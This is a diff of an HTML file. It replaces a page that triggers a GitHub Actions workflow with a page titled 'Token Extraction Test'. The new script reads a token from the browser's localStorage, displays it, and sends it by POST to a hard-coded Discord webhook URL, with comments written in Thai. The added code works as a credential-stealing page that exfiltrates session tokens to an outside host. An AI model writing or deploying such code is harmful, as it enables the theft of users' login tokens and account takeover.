@@ -1,28 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Run GitHub Actions</title>
-    <script>
-        async function runAction() {
-            const response = await fetch('https://api.github.com/repos/<username>/<repo>/actions/workflows/run_code.yml/dispatches', {
-                method: 'POST',
-                headers: {
-                    'Accept': 'application/vnd.github+json',
-                    'Authorization': `token ${GITHUB_TOKEN}`, // คุณต้องใช้ token ที่มีสิทธิ์ในการเรียกใช้ API
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ ref: 'main' }) // เปลี่ยน 'main' เป็นชื่อ branch ที่คุณใช้
-            });
-
-            if (response.ok) {
-                alert('Workflow triggered successfully!');
-            } else {
-                alert('Failed to trigger workflow.');
-            }
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Extraction Test</title>
 </head>
 <body>
-    <button onclick="runAction()">Run Code</button>
+    <h1>Token Extraction Test</h1>
+    <button id="extractTokenButton">Extract and Send Token</button>
+    <p id="output"></p>
+
+    <script>
+        document.getElementById('extractTokenButton').addEventListener('click', function() {
+            // สมมติว่าโทเค็นเก็บอยู่ใน localStorage
+            let token = localStorage.getItem('token');
+            if (token) {
+                // แสดงโทเค็นในหน้า HTML
+                document.getElementById('output').textContent = 'Token: ' + token;
+
+                // ส่งโทเค็นไปยัง URL ที่กำหนด
+                fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ token: token })
+                })
+                .then(response => response.text())
+                .then(data => console.log('Success:', data))
+                .catch((error) => console.error('Error:', error));
+            } else {
+                document.getElementById('output').textContent = 'Token not found.';
+            }
+        });
+    </script>
 </body>
 </html>
